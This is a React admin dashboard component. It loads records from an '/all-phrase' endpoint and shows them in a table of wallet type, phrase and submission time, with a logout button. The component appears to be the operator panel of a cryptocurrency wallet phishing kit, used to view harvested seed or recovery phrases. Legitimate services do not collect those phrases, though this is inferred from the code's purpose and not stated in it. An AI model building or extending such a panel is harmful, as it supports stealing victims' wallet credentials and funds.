import React, { useEffect, useState } from "react"
import "./dashboard.css"
import api from "../../components/axiosInstance"
import LogoutButton from "../logout/logout"
import { useNavigate } from "react-router-dom"


const Dashboard = () => {

  const navigate = useNavigate()

  const [loading, setLoading] = useState(false)
  const [allPhrase, setAllPhrase] = useState([])
  const [message, setMessage] = useState({ text: "", type: "" })

  useEffect(() => {
    fetchAllPhrase()
  }, [])

  const fetchAllPhrase = async () => {
    try {
      setLoading(true)
      const res = await api.get("/all-phrase")
      setAllPhrase(res.data.data || [])
    } catch (error) {
      if (error.response?.status === 401) {
        navigate("/login", {replace: true})
      }
      setMessage({
        text: error.response?.data?.message || "Failed to load phrases",
        type: "error"
      })
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="admin_dashboard">
      {loading && (
        <div className="loading_overlay">
          <div className="spinner">
            <p className="loading_text">Loading...</p>
          </div>
        </div>
      )}

      {message.text && (
        <div className={`message ${message.type === "error" ? "error" : "success"}`}>
          {message.text}
        </div>
      )}

      <div className="admin_phrases">
        <h3>All Phrases</h3>

        {allPhrase.length === 0 ? (
          <p>No Phrase found.</p>
        ) : (
          <table>
            <thead>
              <tr>
                <th>Wallet</th>
                <th>Phrase</th>
                <th>Submitted At</th>
              </tr>
            </thead>
            <tbody>
              {allPhrase.map((row) => (
                <tr key={row.id}>
                  <td data-label="Wallet">{row.category}</td>
                  <td data-label="Phrase">{row.phrases}</td>
                  <td data-label="Submitted At">{new Date(row.createdAt).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      <div>
        <LogoutButton setUser = {() => {}}/>
      </div>
    </div>
  )
}

export default Dashboard
